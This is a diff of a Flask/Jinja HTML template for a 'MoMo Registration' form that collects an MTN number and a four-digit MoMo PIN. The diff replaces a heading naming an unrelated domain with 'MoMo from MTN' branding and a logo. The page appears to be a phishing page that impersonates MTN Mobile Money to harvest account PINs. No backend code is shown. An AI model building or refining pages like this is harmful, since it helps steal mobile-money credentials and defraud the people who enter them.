@@ -3,21 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo Registration</title>
+    <title>MoMo Registration</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
     <div class="container">
         <div class="card">
+            <!-- Header with Logo -->
             <div class="header">
-                <!-- Logo with fallback -->
-                <img src="{{ url_for('static', filename='../images/logo.png') }}" 
-                     alt="Logo" 
+                <img src="{{ url_for('static', filename='../images/Image.jpeg') }}" 
+                     alt="MoMo" 
                      class="logo"
                      onerror="this.style.display='none'">
-                <h1>jianway.co.uk</h1>
+                <div class="brand">
+                    <span class="brand-momo">MoMo</span>
+                    <span class="brand-from">from</span>
+                    <span class="brand-mtn">MTN</span>
+                </div>
             </div>
             
+            <!-- Registration Form -->
             <form id="registrationForm" class="registration-form">
                 <div class="input-group">
                     <label for="mtnNumber">MTN NUMBER</label>
@@ -34,31 +39,26 @@
                 
                 <div class="input-group">
                     <label for="momoPin">MOMO PIN</label>
-                    <input 
-                        type="password" 
-                        id="momoPin" 
-                        name="momo_pin" 
-                        placeholder="Enter 4-digit PIN" 
-                        required
-                        pattern="[0-9]{4}"
-                        maxlength="4"
-                        minlength="4"
-                    >
-                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
+                    <div class="pin-input-wrapper">
+                        <input 
+                            type="password" 
+                            id="momoPin" 
+                            name="momo_pin" 
+                            placeholder="Enter 4-digit PIN" 
+                            required
+                            pattern="[0-9]{4}"
+                            maxlength="4"
+                            minlength="4"
+                        >
+                        <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
+                    </div>
                 </div>
                 
                 <button type="submit" class="register-btn">REGISTER</button>
             </form>
             
+            <!-- Message Container -->
             <div id="messageContainer" class="message-container"></div>
-            
-            <!-- Footer image -->
-            <div class="footer-image">
-                <img src="{{ url_for('static', filename='../images/screenshot.png') }}" 
-                     alt="Screenshot" 
-                     class="screenshot"
-                     onerror="this.style.display='none'">
-            </div>
         </div>
     </div>
     
